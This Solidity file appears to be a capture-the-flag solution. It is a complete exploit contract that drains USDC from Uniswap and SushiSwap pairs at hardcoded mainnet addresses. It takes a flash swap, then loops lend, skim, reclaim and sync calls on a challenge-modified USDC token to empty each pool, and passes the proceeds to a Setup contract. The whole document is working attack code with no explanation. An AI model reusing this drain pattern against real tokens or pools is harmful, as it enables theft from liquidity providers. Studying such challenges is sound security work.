pragma solidity 0.6.12;

import "public/Setup.sol";

interface UniswapV2PairLike {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
}

contract Child {
    FiatTokenV3 private constant USDC = FiatTokenV3(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    UniswapV2PairLike private constant DAI_USDC = UniswapV2PairLike(0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5);
    UniswapV2PairLike private constant WETH_USDC = UniswapV2PairLike(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    UniswapV2PairLike private constant SUSHI_WETH_USDC = UniswapV2PairLike(0x397FF1542f962076d0BFE58eA045FfA2d347ACa0);

    function drainUniswapPool(UniswapV2PairLike pair) internal {
        while (true) {
            uint have = USDC.balanceOf(address(this));
            uint want = USDC.balanceOf(address(pair));

            if (want == 0) {
                return;
            }
            if (have > want) have = want;

            USDC.lend(address(pair), have);
            pair.skim(address(this));
            USDC.reclaim(address(pair), have);
            pair.sync();
        }
    }

    function uniswapV2Call(address, uint, uint amount1Out, bytes memory) public {
        drainUniswapPool(WETH_USDC);

        USDC.transfer(address(DAI_USDC), amount1Out * 1000 / 996);
    }

    function exploit(Setup setup) public {
        DAI_USDC.swap(0, USDC.balanceOf(address(DAI_USDC)) - 1, address(this), hex"00");

        drainUniswapPool(DAI_USDC);
        drainUniswapPool(SUSHI_WETH_USDC);

        USDC.transfer(address(setup), USDC.balanceOf(address(this)));
    }
}

contract Exploit {
    constructor(Setup setup) public {
        new Child().exploit(setup);
    }
}